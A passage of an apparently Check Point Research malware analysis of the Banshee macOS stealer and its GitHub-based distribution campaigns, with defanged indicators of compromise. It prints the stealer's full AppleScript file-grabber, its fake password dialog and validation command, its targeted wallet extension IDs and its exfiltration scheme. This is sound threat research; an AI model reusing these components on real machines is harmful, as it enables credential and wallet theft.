-
-
-&lt;p&gt;&lt;strong&gt;Banshee&lt;/strong&gt; is a fully functional stealer capable of stealing credentials from several browsers, including:&lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li&gt;Chrome&lt;/li&gt;
-
-
-
-&lt;li&gt;Brave&lt;/li&gt;
-
-
-
-&lt;li&gt;Edge&lt;/li&gt;
-
-
-
-&lt;li&gt;Vivaldi&lt;/li&gt;
-
-
-
-&lt;li&gt;Yandex&lt;/li&gt;
-
-
-
-&lt;li&gt;Opera&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;p&gt;In addition to browser credentials, the malware targets various browser extensions, primarily those related to cryptocurrency wallets. It also targets a Two-Factor Authentication (2FA) extension &lt;strong&gt;&lt;code&gt;authenticator.cc—Authenticator&lt;/code&gt;&lt;/strong&gt;. All stolen data is stored in the directory &lt;code&gt;/tmp/$rand10char_dir/Browsers/&lt;/code&gt;. Interestingly, some of these extensions no longer appear to exist, leading us to believe that the end-of-life extensions have been copied and pasted from previous or other “stealer” projects. Banshee is targeting the following browser extensions.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;bhghoamapcdpbohphigoooaddinpkbai        // "authenticator.cc - Authenticator"   &amp;lt;https://chromewebstore.google.com/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai&gt;
-fhbohimaelbohpjbbldcngcnapndodjp        // "BNB Chain Wallet"   &amp;lt;https://chromewebstore.google.com/detail/bnb-chain-wallet/fhbohimaelbohpjbbldcngcnapndodjp&gt;
-fihkakfobkmkjojpchpfgcmhfjnmnfpi        // "BitAppWallet"
-aodkkagnadcbobfpggfnjeongemjbjca        // "BoltX"
-aeachknmefphepccionboohckonoeemg        // "coin98.com - Coin98 Wallet"   &amp;lt;https://chromewebstore.google.com/detail/coin98-wallet/aeachknmefphepccionboohckonoeemg&gt;
-hnfanknocfeofbddgcijnmhnfnkdnaad        // "wallet.coinbase.com - Coinbase Wallet extension"    &amp;lt;https://chromewebstore.google.com/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad&gt;
-agoakfejjabomempkjlepdflaleeobhb        // "core.app - Core | Crypto Wallet &amp;amp; NFT Extension"    &amp;lt;https://chromewebstore.google.com/detail/core-crypto-wallet-nft-ex/agoakfejjabomempkjlepdflaleeobhb&gt;
-pnlfjmlcjdjgkddecgincndfgegkecke        // "Cocobit"
-blnieiiffboillknjnepogjhkgnoapac        // "Equal"
-cgeeodpfagjceefieflmdfphplkenlfk        // "broxus.com EVER Wallet"     &amp;lt;https://chromewebstore.google.com/detail/ever-wallet/cgeeodpfagjceefieflmdfphplkenlfk&gt;
-aholpfdialjgjfhomihkjbmgjidlcdno        // "exodus.com - Exodus Web3 Wallet"    &amp;lt;https://chromewebstore.google.com/detail/exodus-web3-wallet/aholpfdialjgjfhomihkjbmgjidlcdno&gt;
-ebfidpplhabeedpnhjnobghokpiioolj        // "fewcha.app - Fewcha Move Wallet"    &amp;lt;https://chromewebstore.google.com/detail/fewcha-move-wallet/ebfidpplhabeedpnhjnobghokpiioolj&gt;
-cjmkndjhnagcfbpiemnkdpomccnjblmj        // "koii.network - Finnie"   &amp;lt;https://chromewebstore.google.com/detail/finnie/cjmkndjhnagcfbpiemnkdpomccnjblmj&gt;
-hpglfhgfnhbgpjdenjgmdgoeiappafln        // "Guarda"
-nanjmdknhkinifnkgdcggcfnhdaammmj        // "GuildWallet"
-fnnegphlobjdpkhecapkijjdkgcjhkib        // "Harmony Chrome Extension Wallet"
-flpiciilemghbmfalicajoolhkkenfel        // "icon.foundation - ICONex"   &amp;lt;https://chromewebstore.google.com/detail/iconex/flpiciilemghbmfalicajoolhkkenfel&gt;
-cjelfplplebdjjenllpjcblmjkfcffne        // "Jaxx Liberty"
-jblndlipeogpafnldhgmapagcccfchpi        // "Kaia Wallet"    &amp;lt;https://chromewebstore.google.com/detail/kaia-wallet/jblndlipeogpafnldhgmapagcccfchpi&gt;
-pdadjkfkgcafgbceimcpbkalnfnepbnk        // "KardiaChain Wallet"     &amp;lt;https://chromewebstore.google.com/detail/kardiachain-wallet/pdadjkfkgcafgbceimcpbkalnfnepbnk&gt;
-dmkamcknogkgcdfhhbddcghachkejeap        // "keplr.app - Keplr"      &amp;lt;https://chromewebstore.google.com/detail/keplr/dmkamcknogkgcdfhhbddcghachkejeap&gt;
-kpfopkelmapcoipemfendmdcghnegimn        // "Liquality Wallet"
-nlbmnnijcnlegkjjpcfjclmcfggfefdm        // "MEW CX"
-dngmlblcodfobpdpecaadgfbcggfjfnm        // "multiversx.com - MultiversX Wallet"     &amp;lt;https://chromewebstore.google.com/detail/multiversx-wallet/dngmlblcodfobpdpecaadgfbcggfjfnm&gt;
-efbglgofoippbgcjepnhiblaibcnclgk        // "martianwallet.xyz - Martian Aptos &amp;amp; Sui Wallet Extension"       &amp;lt;https://chromewebstore.google.com/detail/martian-aptos-sui-wallet/efbglgofoippbgcjepnhiblaibcnclgk&gt;
-afbcbjpbpfadlkmhmclhkeeodmamcflc        // "mathwallet.org - MathWallet"        &amp;lt;https://chromewebstore.google.com/detail/mathwallet/afbcbjpbpfadlkmhmclhkeeodmamcflc&gt;
-nkbihfbeogaeaoehlefnkodbefgpgknn        // "metamask.io - MetaMask"     &amp;lt;https://chromewebstore.google.com/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn&gt;
-ejbalbakoplchlghecdalmeeeajnimhm        // "MetaMask"
-fcckkdbjnoikooededlapcalpionmalo        // "mobox.io - MOBOX WALLET"    &amp;lt;https://chromewebstore.google.com/detail/mobox-wallet/fcckkdbjnoikooededlapcalpionmalo&gt;
-lpfcbjknijpeeillifnkikgncikgfhdo        // "Nami"   &amp;lt;https://chromewebstore.google.com/detail/nami/lpfcbjknijpeeillifnkikgncikgfhdo&gt;
-jbdaocneiiinmjbjlgalhcelgbejmnid        // "Guarda"
-fhilaheimglignddkjgofkcbgekhenbh        // "oxygen.solutions - Oxygen - Atomic Crypto Wallet"   &amp;lt;https://chromewebstore.google.com/detail/oxygen-atomic-crypto-wall/fhilaheimglignddkjgofkcbgekhenbh&gt;
-mgffkfbidihjpoaomajlbgchddlicgpn        // "Pali Wallet"    &amp;lt;https://chromewebstore.google.com/detail/pali-wallet/mgffkfbidihjpoaomajlbgchddlicgpn&gt;
-ejjladinnckdgjemekebdpeokbikhfci        // "petra.app - Petra Aptos Wallet"     &amp;lt;https://chromewebstore.google.com/detail/petra-aptos-wallet/ejjladinnckdgjemekebdpeokbikhfci&gt;
-bfnaelmomeimhlpmgjnjophhpkkoljpa        // "phantom.app - Phantom"      &amp;lt;https://chromewebstore.google.com/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa&gt;
-phkbamefinggmakgklpkljjmgibohnba        // "pontem.network - Pontem Crypto Wallet - Eth, Sol, BTC +"      &amp;lt;https://chromewebstore.google.com/detail/pontem-crypto-wallet-eth/phkbamefinggmakgklpkljjmgibohnba&gt;
-fnjhmkhhmkbjkkabndcnnogagogbneec        // "Ronin Wallet"   &amp;lt;https://chromewebstore.google.com/detail/ronin-wallet/fnjhmkhhmkbjkkabndcnnogagogbneec&gt;
-lgmpcpglpngdoalbgeoldeajfclnhafa        // "safepal.com - SafePal Extension Wallet"     &amp;lt;https://chromewebstore.google.com/detail/safepal-extension-wallet/lgmpcpglpngdoalbgeoldeajfclnhafa&gt;
-nkddgncdjgjfcddamfgcmfnlhccnimig        // "GuildWallet"
-pocmplpaccanhmnllbbkpgfliimjljgo        // "Slope Wallet"   &amp;lt;https://chromewebstore.google.com/detail/slope-wallet/pocmplpaccanhmnllbbkpgfliimjljgo&gt;
-bhhhlbepdkbapadjdnnojkbgioiodbic        // "solflare.com - Solflare Wallet"     &amp;lt;https://chromewebstore.google.com/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic&gt;
-fhmfendgdocmcbmfikdcogofphimnkno        // "sollet"
-mfhbebgoclkghebffdldpobeajmbecfk        // "westar.io - StarMask"   &amp;lt;https://chromewebstore.google.com/detail/starmask/mfhbebgoclkghebffdldpobeajmbecfk&gt;
-cmndjbecilbocjfkibfbifhngkdmjgog        // "swashapp.io - Swash"    &amp;lt;https://chromewebstore.google.com/detail/swash/cmndjbecilbocjfkibfbifhngkdmjgog&gt;
-ookjlbkiijinhpmnjffcofjonbfbgaoc        // "Temple - Tezos Wallet"  &amp;lt;https://chromewebstore.google.com/detail/temple-tezos-wallet/ookjlbkiijinhpmnjffcofjonbfbgaoc&gt;
-aiifbnbfobpmeekipheeijimdpnlpgpp        // "Station Wallet"     &amp;lt;https://chromewebstore.google.com/detail/station-wallet/aiifbnbfobpmeekipheeijimdpnlpgpp&gt;
-mfgccjchihfkkindfppnaooecgfneiii        // "tokenpocket.pro - TokenPocket - Web3 &amp;amp; Nostr Wallet"    &amp;lt;https://chromewebstore.google.com/detail/tokenpocket-web3-nostr-wa/mfgccjchihfkkindfppnaooecgfneiii&gt;
-nphplpgoakhhjchkkhmiggakijnkhfnd        // "TON Wallet"     &amp;lt;https://chromewebstore.google.com/detail/ton-wallet/nphplpgoakhhjchkkhmiggakijnkhfnd&gt;
-ibnejdfjmmkpcnlpebklmnkoeoihofec        // "TronLink"       &amp;lt;https://chromewebstore.google.com/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec&gt;
-egjidjbpglichdcondbcbdnbeeppgdph        // "trustwallet.com - Trust Wallet"     &amp;lt;https://chromewebstore.google.com/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph&gt;
-amkmjjmmflddogmhpjloimipbofnfjih        // "Wombat - Gaming Wallet for Ethereum &amp;amp; EOS"      &amp;lt;https://chromewebstore.google.com/detail/wombat-gaming-wallet-for/amkmjjmmflddogmhpjloimipbofnfjih&gt;
-hmeobnfnfcmdkdcmlblgagmfpfboieaf        // "xdefi.io - XDEFI Wallet"    &amp;lt;https://chromewebstore.google.com/detail/xdefi-wallet/hmeobnfnfcmdkdcmlblgagmfpfboieaf&gt;
-eigblbgjknlfbajkfhopmcojidlgcehm        // "XMR.PT"     &amp;lt;https://chromewebstore.google.com/detail/xmrpt/eigblbgjknlfbajkfhopmcojidlgcehm&gt;
-bocpokimicclpaiekenaeelehdjllofo        // "XDCPay"     &amp;lt;https://chromewebstore.google.com/detail/xdcpay/bocpokimicclpaiekenaeelehdjllofo&gt;
-ffnbelfdoeiohenkjibnmadjiehjhajb        // "yoroiwallet.com - Yoroi"       &amp;lt;https://chromewebstore.google.com/detail/yoroi/ffnbelfdoeiohenkjibnmadjiehjhajb&gt;
-kncchdigobghenbbaddojjnnaogfppfj        // "iWallet"    &amp;lt;https://chromewebstore.google.com/detail/iwallet/kncchdigobghenbbaddojjnnaogfppfj&gt;
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;Once the browser data is dumped, Banshee proceeds to target wallets found on the machine. The stolen information is stored &lt;code&gt;/tmp/$rand10char_dir/Wallets/&lt;/code&gt;. The targeted wallets are:&lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li&gt;Exodus&lt;/li&gt;
-
-
-
-&lt;li&gt;Electrum&lt;/li&gt;
-
-
-
-&lt;li&gt;Coinomi&lt;/li&gt;
-
-
-
-&lt;li&gt;Guarda&lt;/li&gt;
-
-
-
-&lt;li&gt;Wasabi&lt;/li&gt;
-
-
-
-&lt;li&gt;Atomic&lt;/li&gt;
-
-
-
-&lt;li&gt;Ledger&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;p&gt;The stealer collects various system information, including:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Software &amp;amp; Hardware information by executing the command &lt;code&gt;system_profiler SPSoftwareDataType SPHardwareDataType&lt;/code&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;The external IP address by contacting &lt;code&gt;api.ipify.org&lt;/code&gt; via the command &lt;code&gt;curl -s&lt;/code&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;MacOS password by tricking the user into entering their password through an input pop-up. Command executed and pop-up message: &lt;code&gt;osascript -e \\'display dialog "To launch the application, you need to update the system settings \\n\\nPlease enter your password." with title "System Preferences" with icon caution default answer "" giving up after 30 with hidden answer\\’&lt;/code&gt;
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;The password will be validated by executing the command &lt;code&gt;dscl /Local/Default -authonly &amp;lt;user&amp;gt; &amp;lt;pass&amp;gt;&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;This information is stored in &lt;code&gt;/tmp/$rand10char_dir/system_info.json&lt;/code&gt; which also includes the campaign ID under the key &lt;code&gt;"BUILD_ID:"&lt;/code&gt;.&lt;/p&gt;
-
-
-
-&lt;p&gt;The keychain passwords are stored in &lt;code&gt;/tmp/$rand10char_dir/Passwords/&lt;/code&gt; and the code responsible for this functionality has remained unchanged since the leaked code.&lt;/p&gt;
-
-
-
-&lt;p&gt;The file-grabber functionality is performed using an AppleScript. The script is stored at &lt;code&gt;/tmp/$rand13char&lt;/code&gt;. The code executed is shown below, with the output being stored at &lt;code&gt;/tmp/$rand10char_dir/FileGrabber/&lt;/code&gt;.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;do shell script "osascript -e 'set volume with output muted'";
-set baseFolderPath to (path to home folder as text) &amp;amp; " :";
-set fileGrabberFolderPath to baseFolderPath &amp;amp; "FileGrabber:";
-set notesFolderPath to baseFolderPath &amp;amp; "Notes:";
-tell application "Finder";
-	set username to short user name of (system info) 	if not (exists folder baseFolderPath) then;
-		do shell script "echo 'Creating base folder'";
-		make new folder at (path to home folder) with properties {name:" };
-	end if	try;
-		do shell script "echo 'Creating FileGrabber folder'";
-		make new folder at folder baseFolderPath with properties {name:"FileGrabber"};
-		delay 2 -- Delay to give Finder time to create the folder;
-	end try 	try;
-		do shell script "echo 'Creating Notes folder'";
-		make new folder at folder baseFolderPath with properties {name:"Notes"};
-		delay 2 -- Delay to give Finder time to create the folder;
-	end try 	try;
-		do shell script "echo 'Copying Safari cookies'";
-		set macOSVersion to do shell script "sw_vers -productVersion";
-		if macOSVersion starts with "10.15" or macOSVersion starts with "10.14" then;
-			set safariFolder to ((path to library folder from user domain as text) &amp;amp; "Safari:");
-		else;
-			set safariFolder to ((path to library folder from user domain as text) &amp;amp; "Containers:com.apple.Safari:Data:Library:Cookies:");
-		end if;
-		duplicate file "Cookies.binarycookies" of folder safariFolder to folder fileGrabberFolderPath with replacing;
-		delay 2 -- Delay to give Finder time to copy the file;
-	end try 	try;
-		do shell script "echo 'Copying Notes database'";
-		set homePath to path to home folder as string;
-		set sourceFilePath to homePath &amp;amp; "Library:Group Containers:group.com.apple.notes:NoteStore.sqlite";
-		duplicate file sourceFilePath to folder notesFolderPath with replacing;
-		delay 2 -- Delay to give Finder time to copy the file;
-	end try;
-	set extensionsList to {"txt", "docx", "rtf", "doc", "wallet", "keys", "key"} 	try;
-		do shell script "echo 'Gathering desktop files'";
-		set desktopFiles to every file of desktop;
-		repeat with aFile in desktopFiles;
-			try;
-				set fileExtension to name extension of aFile;
-				if fileExtension is in extensionsList then;
-					set fileSize to size of aFile;
-					if fileSize &amp;lt; 51200 then;
-						do shell script "echo 'Copying file: " &amp;amp; (name of aFile as string) &amp;amp; "'";
-						duplicate aFile to folder fileGrabberFolderPath with replacing;
-						delay 1 -- Delay to give Finder time to copy each file;
-					end if;
-				end if;
-			end try;
-		end repeat;
-	end try 	try;
-		do shell script "echo 'Gathering documents files'";
-		set documentsFiles to every file of folder "Documents" of (path to home folder);
-		repeat with aFile in documentsFiles;
-			try;
-				set fileExtension to name extension of aFile;
-				if fileExtension is in extensionsList then;
-					set fileSize to size of aFile;
-					if fileSize &amp;lt; 51200 then;
-						do shell script "echo 'Copying file: " &amp;amp; (name of aFile as string) &amp;amp; "'";
-						duplicate aFile to folder fileGrabberFolderPath with replacing;
-						delay 1 -- Delay to give Finder time to copy each file;
-					end if;
-				end if;
-			end try;
-		end repeat;
-	end try;
-end tell;
-do shell script "osascript -e 'set volume without output muted'"
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;If the AppleScript execution fails, it will retry up to 30 times, each time attempting to reset permissions by executing the command &lt;code&gt;tccutil reset AppleEvents&lt;/code&gt;.&lt;/p&gt;
-
-
-
-&lt;p&gt;Once the relevant files are collected, the malware displays a failure message to the user, causing them to believe the software solution is not working: &lt;code&gt;osascript -e \\'display dialog "This system does not support running this application." with title "System Error" buttons {"OK"} default button "OK" with icon stop\\'&lt;/code&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;The network communication and exfiltration of stolen data remains unchanged. The process is straightforward. The random folder created at the beginning of the infection, which was used to store all the stolen data, is:&lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li&gt;Zipped&lt;/li&gt;
-
-
-
-&lt;li&gt;XOR encrypted using the campaign ID (&lt;code&gt;BUILD_ID&lt;/code&gt;)&lt;/li&gt;
-
-
-
-&lt;li&gt;Base64 encoded&lt;/li&gt;
-
-
-
-&lt;li&gt;A JSON file named &lt;code&gt;output.json&lt;/code&gt; is created with key &lt;code&gt;data:&lt;/code&gt; and value is the encoded/XORed content of the zipped folder.&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;p&gt;Finally, the file is sent via a POST HTTP request to the command and control server by executing the curl command &lt;code&gt;-X POST -H "Content-Type: application/json" --data&lt;/code&gt;&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30951" height="520" src="https://research.checkpoint.com/wp-content/uploads/2024/12/004-2.png" width="536" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 &amp;#8211; C&amp;amp;C decryption.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;The initial Banshee stealer command and control servers run the Django framework with bots and threat actors interacting with the same server. On further panel developments, the author introduced a &lt;strong&gt;Staging/Relay Server&lt;/strong&gt; with the &lt;code&gt;urls.py&lt;/code&gt; file responding to two paths:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;code&gt;/api/send&lt;/code&gt; for the Bot-C&amp;amp;C communication&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;code&gt;/admin/login&lt;/code&gt; for the Django admin.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;The stolen data were finally sent to another server where the threat actor/admin was able to retrieve the infection statistics and stolen credentials.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30952" height="513" src="https://research.checkpoint.com/wp-content/uploads/2024/12/005-1.png" width="811" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 &amp;#8211; Django C&amp;amp;C panel.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Subsequent campaigns and panel developments rebuilt the Relay Server using FastAPI instead of Django. This shift eliminated the Django-specific &lt;code&gt;/admin/login&lt;/code&gt; path, providing a single option for a POST request at &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30953" height="556" src="https://research.checkpoint.com/wp-content/uploads/2024/12/006-1-1024x556.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 &amp;#8211; FastAPI documentation.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Currently, the server hosting the admin panel is &amp;#8220;hidden&amp;#8221; behind the Relay servers, providing a more stealthy method of hosting malicious infrastructure. This setup enhances the stealth of the attack, making it harder to detect and disrupt the underlying infrastructure.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30955" height="553" src="https://research.checkpoint.com/wp-content/uploads/2024/12/007-1-1024x553.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; Banshee login panel.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;h1 class="wp-block-heading"&gt;GitHub Campaigns&lt;/h1&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; discovered multiple repositories distributing this new Banshee Stealer version specifically targeting MacOS users. The phishing repositories often pretend to offer various cracked software, especially for Adobe software or any other image or video editing solutions.&lt;/p&gt;
-
-
-
-&lt;p&gt;This new, undetected version of &lt;strong&gt;Banshee&lt;/strong&gt; was distributed in at least three waves by multiple repositories. The first occurred between October 18 and 21, through nine repositories, each receiving 10 to 30 stars, increasing their appearance as legitimate. A second smaller campaign occurred somewhere around October 31, while the third wave of repositories was discovered around November 3. These waves used roughly the same number of repositories and stargazers as the first waves. In all cases, the network initially created malicious repositories, mostly empty and without any malicious code. Approximately two weeks later, after the repositories matured, the malicious actions began.&lt;/p&gt;
-
-
-
-&lt;p&gt;The &lt;strong&gt;first campaign&lt;/strong&gt; only targeted MacOS users, distributing two files: &lt;code&gt;Software_Installation_Tool.v3.2.zip&lt;/code&gt; which contained &lt;code&gt;Setup_V3.2.dmg (Setup)&lt;/code&gt;, and &lt;code&gt;Setup_V3.0.dmg&lt;/code&gt;, which contained the same file hash, a new version of &lt;strong&gt;Banshee stealer&lt;/strong&gt;. The binary’s campaign ID was &lt;code&gt;7hsaHicTxe25WLb38j6RTPZfJDmkIB&lt;/code&gt;, and the C&amp;amp;C where the threat-actor received the stolen information was &lt;code&gt;hxxp://41[.]216[.]183[.]49/api/send/&lt;/code&gt;.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30957" height="726" src="https://research.checkpoint.com/wp-content/uploads/2024/12/008-2-1024x726.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; Repositories from first campaign.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;The &lt;strong&gt;second campaign,&lt;/strong&gt; which was “committed” on October 31, targeted both &lt;strong&gt;Windows&lt;/strong&gt; and &lt;strong&gt;MacOS&lt;/strong&gt; users. The repositories redirect victims to a &lt;code&gt;github.io&lt;/code&gt; post containing two malicious archive links: one for &lt;strong&gt;Windows&lt;/strong&gt; with &lt;strong&gt;Lumma Stealer&lt;/strong&gt; and one for &lt;strong&gt;MacOS&lt;/strong&gt; with &lt;strong&gt;Banshee Stealer&lt;/strong&gt;.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30958" height="485" src="https://research.checkpoint.com/wp-content/uploads/2024/12/009-1024x485.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9 &amp;#8211; Commit updating &lt;code&gt;README&lt;/code&gt; content.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30961" height="702" src="https://research.checkpoint.com/wp-content/uploads/2024/12/010.png" width="554" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10 &amp;#8211; Github.io site.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;These two links download the malicious archives from another repository’s release.&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;a href="hxxps://github[.]com/ArvendraChhonkar/todo/releases/download/macosandwindows/Project_v1.2.0.zip" class="download-button"&gt;Download for Windows&amp;lt;/a&gt;
-&amp;lt;a href="hxxps://github[.]com/ArvendraChhonkar/todo/releases/download/macosandwindows/install_setup_v1.2.0.dmg" class="download-button"&gt;Download for macOS&amp;lt;/a&gt;
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;The second &lt;strong&gt;Banshee stealer&lt;/strong&gt; campaign ID was &lt;code&gt;K1WDRRD8E2dHM7i2WFSHyN4DKG3v7q&lt;/code&gt;, and the C&amp;amp;C was unchanged. Last time checked (December 10), the repositories still spread malware and remain undetected despite the fact that the &lt;code&gt;.dmg&lt;/code&gt; file is unzipped and not password protected.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30963" height="357" src="https://research.checkpoint.com/wp-content/uploads/2024/12/011-1024x357.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11 &amp;#8211; Malicious release.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;The &lt;strong&gt;third campaign&lt;/strong&gt; took place around November 3rd and targeted &lt;strong&gt;Windows&lt;/strong&gt; and &lt;strong&gt;MacOS&lt;/strong&gt; users as well. The &lt;strong&gt;Mac&lt;/strong&gt; release &lt;code&gt;Soft.Install.v1.4.zip&lt;/code&gt; contained &lt;code&gt;Installer.dmg (Installer)&lt;/code&gt; which carried the malware. The Bot communicated with the same C&amp;amp;C as the previous campaign but with ID &lt;code&gt;KAriWgOCQrqvyRSnPOnaE6UUBWjELA&lt;/code&gt;. The &lt;strong&gt;Lumma Stealer&lt;/strong&gt; release &lt;code&gt;ExtraModes_v1.6.zip (Setup.exe)&lt;/code&gt; had nine C&amp;amp;C servers with tld &lt;code&gt;.site&lt;/code&gt; , while further endpoints were hosted on Steam. The threat actor behind this campaign uses two stealers in his arsenal: Lumma to target Windows and Banshee to target MacOS.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30964" height="768" src="https://research.checkpoint.com/wp-content/uploads/2024/12/012-1024x768.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12 &amp;#8211; Dual targeting OS campaigns.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Almost all repositories were created before they started pushing malware. The releases hosted two archives, one targeting Windows and the other MacOS.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30965" height="395" src="https://research.checkpoint.com/wp-content/uploads/2024/12/013-1024x395.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13 &amp;#8211; Repository releases.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;h1 class="wp-block-heading"&gt;New Version Campaigns&lt;/h1&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; successfully obtained multiple files from the new version of the &lt;strong&gt;Banshee&lt;/strong&gt; Stealer which introduced string encryption for the first time on September 26th. Since then, we observed over 26 campaigns. Three of them were distributed via GitHub, though there may be more that have yet to be identified. The remaining campaigns appear to use different distribution methods. However, based on the filenames of the obtained files, they still impersonate popular software such as Chrome, TradingView, Zegent, Parallels, Solara, CryptoNews, MediaKIT, and Telegram.&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; collected all the samples, extracted the campaigns and the command and control servers, and obtained the file names masquerading as popular software. By generating the node graph below, we can distinguish two major clusters, primarily separated based on the distribution methods. The first major cluster, with C&amp;amp;C &lt;code&gt;41[.]216.183.49&lt;/code&gt;, possibly distributed most of the Banshee stealer campaigns through malicious repositories commonly using filenames such as “Setup”, “Installer” and “Update”. The second cluster consists of multiple linked command and control servers that share the same &amp;#8220;software&amp;#8221; names, maintaining consistency across various campaigns and changes to the command and control servers.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30966" height="611" src="https://research.checkpoint.com/wp-content/uploads/2024/12/014-1024x611.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14 &amp;#8211; Campaigns clusters.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;One recent campaign from the second cluster, observed on December 3, impersonates a fake Telegram chat through a phishing website, directing the user to download a file. The website retrieves the User-Agent from the request and, if the machine is MacOS, provides the download link and instructions to install it. When visiting the phishing website with Windows or Linux User-Agents, the malicious download link is not displayed. The malicious file is downloaded from &lt;code&gt;hxxps://api7[.]cfd/testet123t/Telegram.dmg&lt;/code&gt;.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30968" height="576" src="https://research.checkpoint.com/wp-content/uploads/2024/12/015-1024x576.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15 &amp;#8211; Phishing site targeting MacOS (left) and Windows (Right).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;The HTML files &lt;code&gt;index.html&lt;/code&gt; as well as &lt;code&gt;mobile.html&lt;/code&gt; contain no other malicious functionality except to report back via &lt;code&gt;sendNotification.php&lt;/code&gt; to the threat actor that a user visited the phishing page. While &lt;code&gt;mac.html&lt;/code&gt; provides the victim with the malicious link to download Banshee. JavaScript code handling the User-Agent is shown below:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;  &amp;lt;script&gt;
-    document.addEventListener('DOMContentLoaded', function () {
